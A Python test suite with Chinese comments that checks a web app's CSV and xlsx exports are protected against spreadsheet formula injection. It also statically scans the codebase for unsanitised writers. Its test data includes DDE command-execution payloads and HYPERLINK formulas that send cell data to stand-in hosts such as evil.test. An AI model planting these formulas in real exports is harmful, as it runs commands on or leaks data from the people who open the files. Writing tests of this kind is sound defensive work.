"""匯出的 CSV 不可以讓試算表把內容當公式執行（CSV / 公式注入，CWE-1236）。

## 為什麼這是真的風險，不是理論

最強的一條路徑是**註解匯出**：註解的作者與內容來自**別人給的 PDF**。
攻擊者寄一份 PDF 過來，把註解作者填成 `=cmd|'/c calc'!A1`，收件者用本工具匯出
CSV、用 Excel 打開 —— 公式就在他的電腦上執行。整個過程受害者只是在「看看對方
的註解有哪些」。

稽核記錄匯出同理，而且開檔的人是**管理員**：`target` 與 `details` 欄位裡有檔名，
檔名是使用者取的。

Excel 對 `=` 開頭會跳一次警告，但：
* 那個警告長得像一般的「啟用內容」提示，使用者很習慣按下去；
* `=HYPERLINK("http://evil/?d="&A1,"點我")` **完全不會跳警告**，點一下就把同列
  資料送出去；
* LibreOffice / Numbers / Google 試算表的行為各不相同，不能假設有警告。

## 修法

OWASP 的做法：值若以 `= + - @` 或定位 / 換行字元開頭，前面補一個單引號。
單引號在試算表裡代表「以下是文字」，開檔看到的內容不變，但不會被當成公式。
數字型欄位（頁碼、座標）不受影響 —— 它們不以那些字元開頭。
"""
from __future__ import annotations

import csv
import re
import io

import pytest

from app.core.csv_safe import sanitize


DANGEROUS = (
    "=cmd|'/c calc'!A1",
    "+1+1",
    "-1+1",
    "@SUM(1+1)",
    '=HYPERLINK("http://evil.test/?d="&A1,"click")',
    "\t=1+1",
    "\r=1+1",
)

SAFE = ("hello", "台北市", "2026-07-30", "123", "", "a=b", " =1+1")


# ---------- helper 本身 ----------

@pytest.mark.parametrize("value", DANGEROUS)
def test_dangerous_values_are_neutralised(value):
    out = sanitize(value)
    assert out.startswith("'"), f"{value!r} 沒有被中和 → {out!r}"
    # 內容本身不可被改動（使用者看到的字要一樣）
    assert out[1:] == value


@pytest.mark.parametrize("value", SAFE)
def test_safe_values_are_untouched(value):
    assert sanitize(value) == value


def test_lone_dash_is_also_quoted_and_that_is_intended():
    """單獨一個 `-`（我們常用的「無資料」佔位符）也會被加引號。

    這是刻意的：只看開頭字元才不會有漏網的變形。試算表顯示出來仍是 `-`，
    使用者看不出差別。
    """
    assert sanitize("-") == "'-"


def test_non_string_passes_through():
    """數字 / None 不可以被轉成奇怪的字串（頁碼、座標欄位會用到）。"""
    assert sanitize(3) == 3
    assert sanitize(3.5) == 3.5
    assert sanitize(None) == ""


def test_already_quoted_is_not_double_quoted():
    assert sanitize("'=1+1") == "'=1+1"


# ---------- 實際的匯出端 ----------

def _cells(data: bytes) -> list[str]:
    text = data.decode("utf-8").lstrip("﻿")
    return [c for row in csv.reader(io.StringIO(text)) for c in row]


def test_annotation_csv_export_is_neutralised():
    """註解的作者 / 內容來自對方給的 PDF —— 這是最強的一條路徑。"""
    from app.tools.pdf_annotations.router import _render_csv
    annots = [{
        "page": 1, "type_label": "文字註解",
        "author": "=cmd|'/c calc'!A1",
        "subject": "@SUM(1+1)",
        "content": '=HYPERLINK("http://evil.test","click")',
        "created": "", "modified": "", "rect": [0, 0, 1, 1],
    }]
    cells = _cells(_render_csv(annots))
    bad = [c for c in cells if c[:1] in ("=", "+", "-", "@") and c not in ("-",)]
    assert not bad, f"這些欄位仍會被當成公式：{bad}"


def test_annotation_todo_csv_export_is_neutralised():
    from app.tools.pdf_annotations.router import _render_todo_csv
    annots = [{
        "page": 2, "type_label": "註記", "author": "=1+1",
        "subject": "", "content": "@SUM(A1)",
    }]
    cells = _cells(_render_todo_csv(annots))
    bad = [c for c in cells if c[:1] in ("=", "+", "@")]
    assert not bad, f"這些欄位仍會被當成公式：{bad}"


def test_annotation_csv_still_readable():
    """中和之後，正常內容不可以變樣。"""
    from app.tools.pdf_annotations.router import _render_csv
    annots = [{
        "page": 3, "type_label": "重點", "author": "王小明",
        "subject": "請確認", "content": "這一段要改",
        "created": "2026-07-30", "modified": "", "rect": [1, 2, 3, 4],
    }]
    cells = _cells(_render_csv(annots))
    for expected in ("王小明", "請確認", "這一段要改", "2026-07-30", "3"):
        assert expected in cells, f"正常內容不見了：{expected}"


def test_audit_csv_export_is_neutralised(admin_session):
    """稽核匯出的開檔者是管理員 —— target / details 裡有使用者取的檔名。"""
    from app.core import audit_db
    c, _, _ = admin_session
    audit_db.log_event("tool_invoke", username="tester", ip="127.0.0.1",
                       target="=cmd|'/c calc'!A1",
                       details={"filename": "@SUM(1+1).pdf"})
    audit_db.flush_for_tests() if hasattr(audit_db, "flush_for_tests") else None
    import time
    time.sleep(0.4)          # 稽核寫入走背景 queue
    r = c.get("/admin/audit/export.csv")
    assert r.status_code == 200, r.status_code
    cells = _cells(r.content)
    bad = [x for x in cells if x[:1] in ("=", "+", "@")]
    assert not bad, f"稽核 CSV 仍有公式欄位：{bad[:3]}"


def test_text_list_csv_export_is_neutralised(client):
    """清單處理的 CSV 匯出（使用者自己的資料，一致性也要做）。"""
    r = client.post("/tools/text-list/export",
                    data={"text": "=1+1\n@SUM(2)\nnormal", "fmt": "csv",
                          "op": "none"})
    if r.status_code == 404:
        pytest.skip("端點路徑不同，改由 _render 層測試")
    assert r.status_code == 200, r.status_code
    cells = _cells(r.content)
    bad = [x for x in cells if x[:1] in ("=", "+", "@")]
    assert not bad, f"清單 CSV 仍有公式欄位：{bad}"


# ---------- xlsx：比 CSV 更危險（連警告都不會跳） ----------

def _xlsx_cells(data: bytes):
    import openpyxl, io as _io
    wb = openpyxl.load_workbook(_io.BytesIO(data))
    ws = wb.active
    return [(c.value, c.data_type) for row in ws.iter_rows() for c in row]


def test_openpyxl_treats_equals_as_formula_by_default():
    """釘住這個前提：openpyxl 預設會把 `=` 開頭的字串存成**真正的公式**。

    這正是 xlsx 比 CSV 危險的原因 —— Excel 打開一個合法的公式儲存格不會有任何
    警告。如果哪天 openpyxl 改了行為，這條會紅，提醒我們重新評估。
    """
    import openpyxl
    ws = openpyxl.Workbook().active
    assert ws.cell(row=1, column=1, value="=1+1").data_type == "f"


def test_xlsx_cell_helper_forces_text():
    import openpyxl
    from app.core import csv_safe
    ws = openpyxl.Workbook().active
    assert csv_safe.xlsx_cell(ws, 1, 1, "=1+1").data_type == "s"
    assert csv_safe.xlsx_cell(ws, 2, 1, "正常").value == "正常"
    assert csv_safe.xlsx_cell(ws, 3, 1, 42).data_type == "n"     # 數字仍是數字


def test_einvoice_xlsx_export_has_no_formula_cells():
    """欄位值來自**收到的發票 PDF** —— 外部來源。"""
    from app.tools.einvoice_scan import exporter
    invoices = [{"invoice_number": "=cmd|'/c calc'!A1", "seller_name": "@SUM(1)",
                 "total": 100, "invoice_date": "2026-07-30"}]
    cols = ["invoice_number", "seller_name", "total", "invoice_date"]
    data = exporter.export_xlsx(invoices, cols, {})
    bad = [(v, t) for v, t in _xlsx_cells(data) if t == "f"]
    assert not bad, f"仍有公式儲存格：{bad}"


def test_transit_proof_xlsx_export_has_no_formula_cells():
    from app.tools.transit_proof import exporter
    entries = [{"date": "2026-07-30", "from_stop": "=1+1", "to_stop": "@A1",
                "amount": 30}]
    cols = ["date", "from_stop", "to_stop", "amount"]
    data = exporter.export_xlsx(entries, cols, {})
    bad = [(v, t) for v, t in _xlsx_cells(data) if t == "f"]
    assert not bad, f"仍有公式儲存格：{bad}"


def test_einvoice_csv_export_is_neutralised():
    from app.tools.einvoice_scan import exporter
    invoices = [{"invoice_number": "=cmd|'/c calc'!A1", "seller_name": "@SUM(1)"}]
    data = exporter.export_csv(invoices, ["invoice_number", "seller_name"], {})
    bad = [c for c in _cells(data) if c[:1] in ("=", "@", "+")]
    assert not bad, f"仍有公式欄位：{bad}"


def test_transit_proof_csv_export_is_neutralised():
    from app.tools.transit_proof import exporter
    entries = [{"date": "=1+1", "from_stop": "@A1"}]
    data = exporter.export_csv(entries, ["date", "from_stop"], {})
    bad = [c for c in _cells(data) if c[:1] in ("=", "@", "+")]
    assert not bad, f"仍有公式欄位：{bad}"


def test_all_xlsx_writers_go_through_the_helper():
    """靜態守門：不可以再有人直接 `ws.cell(..., value=<字串>)` 寫資料列。

    只允許表頭 / 樣式那類寫死的字面值（那不是使用者輸入）。判斷方式是
    「value= 後面接的是不是字面字串」—— 變數就要走 helper。
    """
    import ast
    import pathlib
    bad = []
    for f in sorted(pathlib.Path("app").rglob("*.py")):
        if f.name == "csv_safe.py":
            continue                         # helper 自己就是那個唯一的出口
        text = f.read_text(encoding="utf-8")
        if "openpyxl" not in text:
            continue
        try:
            tree = ast.parse(text)
        except SyntaxError:      # pragma: no cover
            continue
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            src = ast.unparse(node)
            if not re.match(r"^ws\.cell\(", src):
                continue
            kw = {k.arg: k.value for k in node.keywords}
            v = kw.get("value")
            if v is None:
                continue                     # 只是取格子，沒寫值
            if isinstance(v, ast.Constant):
                continue                     # 寫死的表頭字串
            bad.append(f"{f}:{node.lineno}  {src[:70]}")
    assert not bad, (
        "這些地方直接寫入 xlsx 儲存格，請改用 csv_safe.xlsx_cell：\n  "
        + "\n  ".join(bad))


# ---------------------------------------------------------------------------
# 逐句翻譯的 CSV —— v1.14.31 對抗式驗證抓到的漏網之魚
# ---------------------------------------------------------------------------

def test_translate_doc_csv_neutralises_formulas():
    """逐句翻譯的 CSV 匯出也要中和公式。

    `source` 欄的內容來自使用者上傳的文件 —— 也就是**別人寄來的** PDF / Word，
    內容完全不受控。同一支檔案的 xlsx 匯出早就走 `csv_safe` 了，只有 CSV
    這條漏掉，實測走真正的 HTTP 端點可以打出兩列會被 Excel 當公式執行的內容。
    """
    from app.tools.translate_doc.router import _build_csv

    pairs = [
        {"source": "=cmd|'/c calc.exe'!A1",
         "target": '=HYPERLINK("http://evil.example/?d="&A1,"點我看報價")'},
        {"source": "+1+1", "target": "@SUM(1)"},
        {"source": "-5", "target": "正常句子"},
    ]
    text = _build_csv(pairs).decode("utf-8-sig")
    for line in text.splitlines()[1:]:
        if not line:
            continue
        # 去掉 CSV 的外層引號之後，第一個字元不可以是公式起始符號
        first = line.lstrip('"')[:1]
        assert first not in "=+-@", f"這一列會被 Excel 當公式執行：{line}"


def test_translate_doc_csv_keeps_normal_text_intact():
    """中和不可以把正常內容改壞。"""
    from app.tools.translate_doc.router import _build_csv

    text = _build_csv([{"source": "Hello world", "target": "你好，世界"}])
    body = text.decode("utf-8-sig")
    assert "Hello world" in body and "你好，世界" in body


# ---------------------------------------------------------------------------
# 全站掃描：任何寫進 CSV 的「資料」都要中和過
# ---------------------------------------------------------------------------

#: 允許不走 `csv_safe` 的例外，**每一條都要寫清楚為什麼安全**。
#: 沒有理由就不該在這裡。
_ALLOWED = {
    # 全部是整數統計欄位，不可能以 = + - @ 開頭
    "app/tools/pdf_wordcount/router.py",
}


def test_every_csv_data_row_is_neutralised():
    """逐一檢查 `writerow` / `writerows` 的資料列有沒有走 `csv_safe`。

    ## 為什麼要用掃描而不是逐支測

    這個專案修過一次公式注入，然後**又長回來**：逐句翻譯的 CSV 沒走
    `csv_safe`（而同一支檔案的 xlsx 走了），電子發票與乘車證明的**欄位標題**
    也沒走 —— 而那個標題是每位使用者自己可以設定的，塞公式進去、匯出 CSV
    寄給會計，就在對方的 Excel 裡執行。

    逐支寫測試永遠追不上新工具，掃描才追得上。

    標題列（整個是字串常數的 list）不算資料，跳過。
    """
    import ast
    import pathlib

    root = pathlib.Path(__file__).resolve().parent.parent
    bad = []
    for f in sorted((root / "app").rglob("*.py")):
        rel = str(f.relative_to(root))
        if rel in _ALLOWED:
            continue
        try:
            tree = ast.parse(f.read_text(encoding="utf-8"))
        except SyntaxError:
            continue
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            fn = node.func
            if not (isinstance(fn, ast.Attribute)
                    and fn.attr in ("writerow", "writerows")):
                continue
            arg = node.args[0] if node.args else None
            # 標題列：整個是字串常數
            if isinstance(arg, (ast.List, ast.Tuple)) and arg.elts and all(
                    isinstance(e, ast.Constant) and isinstance(e.value, str)
                    for e in arg.elts):
                continue
            src = ast.unparse(node)
            if "csv_safe" in src:
                continue
            bad.append(f"{rel}:{node.lineno}  {src[:80]}")

    assert not bad, (
        "這些 CSV 寫入沒有中和公式（`=` `+` `-` `@` 開頭的儲存格會被 Excel "
        "當程式執行）：\n" + "\n".join(bad)
        + "\n改用 `csv_safe.row(...)`；確定安全的話寫進本檔的 `_ALLOWED` 並附理由。")
